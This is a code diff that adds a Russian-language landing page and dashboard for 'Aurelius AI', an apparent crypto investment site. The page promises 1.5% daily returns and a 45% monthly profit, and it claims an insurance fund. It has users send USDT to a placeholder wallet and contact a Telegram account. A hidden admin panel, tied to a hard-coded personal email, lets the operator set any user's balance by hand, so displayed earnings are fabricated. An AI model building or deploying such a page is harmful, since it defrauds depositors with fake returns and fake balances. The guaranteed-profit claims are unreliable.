@@ -1,13 +1,159 @@
-            const { data } = await supabase.from('profiles').select('balance').eq('id', session.user.id).single();
-            if(data) document.getElementById('balance-val').innerText = parseFloat(data.balance).toFixed(2);
-        }
-    });
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aurelius AI | Инвестиции будущего</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --gold: #ffcc00; --dark: #050505; --glass: rgba(255, 255, 255, 0.05); }
+        body { margin: 0; font-family: 'Roboto', sans-serif; background: var(--dark); color: white; }
+        
+        #video-bg { position: fixed; top: 0; left: 0; min-width: 100%; min-height: 100%; z-index: -1; opacity: 0.4; filter: brightness(0.5); }
 
-    async function updateBalance() {
-        const id = document.getElementById('target-id').value, amt = document.getElementById('new-amount').value;
-        await supabase.from('profiles').update({ balance: amt }).eq('id', id);
-        alert("Done!");
+        .container { max-width: 1100px; margin: 0 auto; padding: 20px; }
+        header { display: flex; justify-content: space-between; align-items: center; padding: 30px 0; }
+        .logo { font-family: 'Orbitron', sans-serif; font-size: 2.2em; color: var(--gold); text-shadow: 0 0 20px rgba(255, 204, 0, 0.6); }
+
+        .hero { text-align: center; padding: 80px 0; }
+        .hero h1 { font-family: 'Orbitron', sans-serif; font-size: 3.5em; margin-bottom: 20px; letter-spacing: 2px; }
+        .hero p { font-size: 1.3em; color: #aaa; margin-bottom: 40px; }
+        
+        .btn-gold { background: var(--gold); color: black; padding: 18px 45px; border: none; border-radius: 8px; font-weight: 900; cursor: pointer; text-decoration: none; font-size: 1.1em; transition: 0.3s; }
+        .btn-gold:hover { transform: translateY(-3px); box-shadow: 0 10px 30px rgba(255, 204, 0, 0.4); }
+
+        .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; margin: 60px 0; }
+        .card { background: var(--glass); padding: 40px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(15px); text-align: center; }
+        .card h3 { color: var(--gold); font-family: 'Orbitron'; margin-bottom: 15px; }
+
+        .calc-section { background: rgba(255, 204, 0, 0.03); border: 1px solid var(--gold); padding: 50px; border-radius: 30px; text-align: center; margin-bottom: 80px; }
+        .calc-input { background: #111; border: 2px solid #333; color: white; padding: 15px; width: 250px; border-radius: 10px; font-size: 1.5em; text-align: center; outline: none; transition: 0.3s; }
+        .calc-input:focus { border-color: var(--gold); }
+
+        #auth-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; }
+        .auth-box { background: #0a0a0a; padding: 50px; border-radius: 25px; border: 1px solid var(--gold); width: 100%; max-width: 450px; text-align: center; }
+        .auth-box input { width: 100%; padding: 15px; margin: 10px 0; background: #151515; border: 1px solid #333; color: white; border-radius: 8px; }
+
+        .dashboard { display: none; padding-top: 50px; }
+        .admin-panel { border: 2px dashed #ff4444; padding: 30px; margin-top: 100px; border-radius: 20px; background: rgba(255,0,0,0.05); }
+    </style>
+</head>
+<body>
+
+<video autoplay muted loop id="video-bg">
+    <source src="https://assets.mixkit.co/videos/preview/mixkit-data-center-server-room-with-blue-and-red-lights-31846-large.mp4" type="video/mp4">
+</video>
+
+<div class="container" id="main-ui">
+    <header>
+        <div class="logo">AURELIUS</div>
+        <button class="btn-gold" onclick="showAuth()">ВХОД / РЕГИСТРАЦИЯ</button>
+    </header>
+
+    <section class="hero">
+        <h1>AURELIUS AI TERMINAL</h1>
+        <p>Искусственный интеллект для управления вашим капиталом. Стабильные 1.5% в сутки.</p>
+        <button class="btn-gold" onclick="showAuth()">ОТКРЫТЬ СЧЕТ</button>
+    </section>
+
+    <div class="calc-section">
+        <h2 style="font-family: 'Orbitron';">КАЛЬКУЛЯТОР ДОХОДА</h2>
+        <p>Введите сумму инвестиции ($)</p>
+        <input type="number" id="sum-in" class="calc-input" value="100" oninput="doCalc()">
+        <h3 style="margin-top:30px;">Ваша чистая прибыль через месяц:</h3>
+        <div id="sum-out" style="font-size: 3em; color: var(--gold); font-weight: 900;">145.00 $</div>
+    </div>
+
+    <div class="card-grid">
+        <div class="card"><h3>AI АНАЛИЗ</h3><p>Система сканирует рынок 24/7 и входит только в прибыльные сделки.</p></div>
+        <div class="card"><h3>ЗАЩИТА</h3><p>Средства застрахованы резервным фондом Aurelius на сумму $5,000,000.</p></div>
+        <div class="card"><h3>ВЫПЛАТЫ</h3><p>Мгновенный вывод на любые криптокошельки и банковские карты.</p></div>
+    </div>
+</div>
+
+<div class="container dashboard" id="dash">
+    <h1 id="user-email" style="color: var(--gold);">Загрузка...</h1>
+    <div class="card-grid">
+        <div class="card"><h3>ВАШ БАЛАНС</h3><div id="user-bal" style="font-size: 2.5em; font-weight: 900;">0.00 $</div></div>
+        <div class="card"><h3>АКТИВНЫЙ БОНУС</h3><div style="font-size: 1.5em; color: #00ff00;">+15% ПРИМЕНЕН</div></div>
+    </div>
+    
+    <div class="calc-section" style="border-color: #333;">
+        <h2>ПОПОЛНЕНИЕ БАЛАНСА</h2>
+        <p>Отправьте сумму на кошелек и напишите ID в поддержку</p>
+        <p><b>USDT (TRC20):</b> TYv7QJz4... (твой адрес)</p>
+        <button class="btn-gold" onclick="window.open('https://t.me/твой_ник')">ПОДДЕРЖКА</button>
+    </div>
+
+    <div id="admin-box" class="admin-panel" style="display:none;">
+        <h2 style="color: #ff4444;">👑 ADMIN CONTROL</h2>
+        <input type="text" id="target-id" placeholder="User ID" class="calc-input" style="width: 300px; font-size: 1em;">
+        <input type="number" id="target-val" placeholder="Сумма" class="calc-input" style="width: 150px; font-size: 1em;">
+        <button class="btn-gold" onclick="setBalance()" style="background: #ff4444; color: white;">ОБНОВИТЬ</button>
+    </div>
+</div>
+
+<div id="auth-overlay">
+    <div class="auth-box">
+        <h2 style="font-family:'Orbitron'; color:var(--gold)">AURELIUS LOGIN</h2>
+        <input type="email" id="email" placeholder="Email">
+        <input type="password" id="pass" placeholder="Password">
+        <button class="btn-gold" style="width:100%; margin-top:20px;" onclick="auth()">ВОЙТИ / СОЗДАТЬ</button>
+        <p style="margin-top:20px; cursor:pointer; opacity:0.5;" onclick="hideAuth()">Закрыть</p>
+    </div>
+</div>
+
+<script>
+    const supabaseUrl = 'https://kxpsdcepytmnbtzexlup.supabase.co';
+    const supabaseKey = 'sb_publishable_VtS1oNI1B5mbrEnMn8YtsQ_-Ok6y6k7';
+    const _supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
+    function doCalc() {
+        let val = document.getElementById('sum-in').value;
+        document.getElementById('sum-out').innerText = (val * 1.45).toFixed(2) + " $";
     }
+
+    function showAuth() { document.getElementById('auth-overlay').style.display = 'flex'; }
+    function hideAuth() { document.getElementById('auth-overlay').style.display = 'none'; }
+
+    async function auth() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('pass').value;
+        const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
+        
+        if (error) {
+            const { error: regErr } = await _supabase.auth.signUp({ email, password });
+            if (regErr) alert(regErr.message);
+            else alert("Аккаунт создан! Попробуйте войти (если вы отключили Confirm Email в Supabase - впустит сразу)");
+        } else {
+            location.reload();
+        }
+    }
+
+    async function init() {
+        const { data: { user } } = await _supabase.auth.getUser();
+        if (user) {
+            document.getElementById('main-ui').style.display = 'none';
+            document.getElementById('dash').style.display = 'block';
+            document.getElementById('user-email').innerText = "Account: " + user.email;
+
+            if (user.email === 'keslerlaslo@gmail.com') document.getElementById('admin-box').style.display = 'block';
+
+            const { data } = await _supabase.from('profiles').select('balance').eq('id', user.id).single();
+            if (data) document.getElementById('user-bal').innerText = data.balance.toFixed(2) + " $";
+        }
+    }
+
+    async function setBalance() {
+        const id = document.getElementById('target-id').value;
+        const val = document.getElementById('target-val').value;
+        const { error } = await _supabase.from('profiles').update({ balance: val }).eq('id', id);
+        alert(error ? error.message : "Баланс обновлен!");
+    }
+
+    init();
 </script>
 </body>
-</html>
+            </html>
+            
